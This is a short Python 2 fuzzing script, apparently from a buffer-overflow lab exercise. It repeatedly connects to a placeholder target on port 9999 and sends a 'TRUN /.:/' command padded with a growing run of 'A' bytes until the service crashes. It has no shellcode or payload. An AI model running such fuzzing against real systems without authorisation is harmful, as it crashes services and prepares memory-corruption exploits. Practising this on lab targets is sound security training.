#!/usr/bin/python
import sys, socket
from time import sleep

num = 100
buffer = "A" * num

while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		
		s.connect(('target ip',9999))

		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"* num

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit() 
